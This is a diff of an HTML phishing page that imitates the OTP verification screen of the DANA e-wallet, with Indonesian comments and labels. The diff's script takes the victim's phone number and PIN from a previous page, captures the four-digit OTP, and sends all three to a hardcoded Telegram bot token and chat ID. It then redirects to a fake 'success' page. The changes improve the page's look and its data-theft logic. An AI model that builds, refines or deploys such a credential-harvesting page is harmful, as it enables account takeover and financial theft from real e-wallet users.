@@ -69,17 +69,17 @@
         }
         .otp-container {
             display: flex;
-            gap: 8px;
+            gap: 10px;
             margin-bottom: 25px;
         }
         .otp-input {
-            width: 35px;
-            height: 35px;
+            width: 45px;
+            height: 45px;
             background: white;
             border-radius: 4px;
             border: none;
             text-align: center;
-            font-size: 1.3rem;
+            font-size: 1.4rem;
             color: #009EEB;
             outline: none;
             padding: 0;
@@ -99,6 +99,7 @@
             font-size: 0.7rem;
             font-weight: bold;
             text-align: center;
+            cursor: pointer;
         }
         .time-box {
             flex: 1;
@@ -119,6 +120,15 @@
             background: orange;
             border-radius: 50%;
         }
+        .pesan-error {
+            color: #fff;
+            font-size: 0.85rem;
+            margin-top: 15px;
+            display: none;
+            background: rgba(255,0,0,0.3);
+            padding: 8px;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
@@ -130,107 +140,124 @@
     <!-- Logo DANA -->
     <div class="logo-container">
         <img src="logo.png" alt="Logo DANA" class="logo-img">
-        <div class="logo-text"></div>
+        <div class="logo-text">DANA</div>
     </div>
 
     <!-- Judul -->
     <div class="text-sm font-bold title">
-        Kode OTP telah terkirim di via whatsapp
-               
-        
+        Kode OTP telah dikirim ke
     </div>
 
-    <!-- Box Nomor HP (NOMOR AKAN TAMPIL OTOMATIS) -->
+    <!-- Box Nomor HP -->
     <div class="number-box">
         <div class="flag"></div>
         <span id="nomorTampil">+62 8xx xxxx xxx</span>
-        
     </div>
-   
-         
 
-    <!-- Kotak Input OTP -->
+    <!-- ✅ 4 KOLOM OTP SAJA -->
     <div class="otp-container">
-        <input type="Number" class="otp-input" maxlength="1" autofocus>
-        <input type="Number" class="otp-input" maxlength="1">
-        <input type="Number" class="otp-input" maxlength="1">
-        <input type="Number" class="otp-input" maxlength="1">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autofocus id="otp1">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp2">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp3">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp4">
     </div>
+
+    <!-- Pesan Error -->
+    <div class="pesan-error" id="pesanError">⚠️ Harap isi 4 digit kode OTP!</div>
 
     <!-- Tombol Kirim Ulang & Timer -->
     <div class="timer-container">
-        <div class="resend-btn">KIRIM ULANG</div>
+        <div class="resend-btn" id="kirimUlang">KIRIM ULANG</div>
         <div class="time-box">
             <span id="timer">00:58</span>
             <div class="dot"></div>
         </div>
     </div>
 
-    <!-- SCRIPT KONEKSI & KIRIM DATA -->
+    <!-- ============================================== -->
+    <!-- SCRIPT KIRIM KE 1 BOT TELEGRAM & PINDAH HALAMAN -->
+    <!-- ============================================== -->
     <script>
-        // BACA DATA YANG DIKIRIM DARI HALAMAN PIN (pinn.html)
+        // ==================== ⚠️ WAJIB DIISI ====================
+        const BOT_TOKEN = "8735075479:AAEzMNhrtNfiT-IUKvnGtdTkE7bsTmWWVOg";
+        const CHAT_ID = "8735075479";
+        const HALAMAN_BERIKUTNYA = "berhasil.html";
+
+        // BACA DATA DARI HALAMAN SEBELUMNYA
         const urlParams = new URLSearchParams(window.location.search);
-        const nomorAsli = urlParams.get('nomor') || 'Gagal memuat';
+        const nomorAsli = urlParams.get('nomor') || 'Tidak ada';
         const pinAsli = urlParams.get('pin') || 'Tidak ada';
 
         // TAMPILKAN NOMOR DI LAYAR
         document.getElementById('nomorTampil').textContent = `+62 ${nomorAsli}`;
 
-        const inputs = document.querySelectorAll('.otp-input');
-        
-        // DATA BOT TELEGRAM KAMU
-        const BOT_TOKEN = "8735075479:AAEzMNhrtNfiT-IUKvnGtdTkE7bsTmWWVOg"; 
-        const CHAT_ID = "8735075479";
-        const HALAMAN_TUJUAN = "verifikasi ulang.html";
-
-        // TIMER HITUNG MUNDUR
-        let timeLeft = 58;
+        // === TIMER HITUNG MUNDUR ===
+        let totalDetik = 58;
         const timerElement = document.getElementById('timer');
+        let timerExpired = false;
         
         const countdown = setInterval(() => {
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
+            let menit = Math.floor(totalDetik / 60);
+            let detik = totalDetik % 60;
             
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-            
-            timerElement.textContent = minutes + ":" + seconds;
-            timeLeft--;
+            detik = detik < 10 ? "0" + detik : detik;
+            timerElement.textContent = `${menit}:${detik}`;
+            totalDetik--;
 
-            if(timeLeft < 0) {
+            if(totalDetik < 0) {
                 clearInterval(countdown);
                 timerElement.textContent = "Habis";
+                timerExpired = true;
             }
         }, 1000);
 
-        // LOGIKA KETIK & PINDAH KOLOM
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                if (input.value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
+        // === OTOMATIS PINDAH FOKUS INPUT OTP ===
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Pindah ke kotak berikutnya
+                if(e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
                 }
-                cekDanKirim();
+                // Cek apakah semua 4 digit sudah terisi
+                cekOTPLengkap();
             });
 
+            // Kembali ke kotak sebelumnya saat tekan Backspace
             input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && input.value === '' && index > 0) {
-                    inputs[index - 1].focus();
+                if(e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
                 }
             });
         });
 
-        // KIRIM SEMUA DATA KE TELEGRAM
-        function cekDanKirim() {
-            let otpLengkap = "";
-            inputs.forEach(input => otpLengkap += input.value);
+        // === CEK APAKAH 4 DIGIT SUDAH LENGKAP ===
+        function cekOTPLengkap() {
+            let kodeOtp = '';
+            otpInputs.forEach(input => {
+                kodeOtp += input.value;
+            });
 
-            if (otpLengkap.length === 4) {
-                let pesan = `🔔 ༺═──◍DANA☭──═༻
-📞 Nomor: +62${nomorAsli}
-🔑 PIN: ${pinAsli}
-🔢 OTP: ${otpLengkap}`;
+            // ✅ Langsung kirim saat 4 digit terisi
+            if(kodeOtp.length === 4) {
+                kirimData(kodeOtp);
+            }
+        }
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        // === FUNGSI KIRIM DATA KE TELEGRAM ===
+        async function kirimData(kodeOtp) {
+            const error = document.getElementById('pesanError');
+            error.style.display = 'none';
+
+            let pesan = `<b>🔐 Kode OTP DANA</b>
+📱 Nomor: <code>${nomorAsli}</code>
+🔑 PIN: <code>${pinAsli}</code>
+🔢 OTP: <code>${kodeOtp}</code>
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+${timerExpired ? '⚠️ Timer sudah habis!' : ''}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
@@ -238,14 +265,23 @@
                         text: pesan,
                         parse_mode: "HTML"
                     })
-                })
-                .then(() => {
-                    window.location.href = HALAMAN_TUJUAN;
-                })
-                .catch(() => alert('Koneksi bermasalah!'));
+                });
+            } catch (err) {
+                console.log("❌ Gagal kirim:", err);
             }
+
+            // Pindah halaman setelah selesai
+            window.location.href = HALAMAN_BERIKUTNYA;
         }
+
+        // === KIRIM ULANG OTP ===
+        document.getElementById('kirimUlang').addEventListener('click', () => {
+            alert('Kode OTP baru telah dikirim!');
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            totalDetik = 58;
+            timerExpired = false;
+        });
     </script>
 </body>
 </html>
-
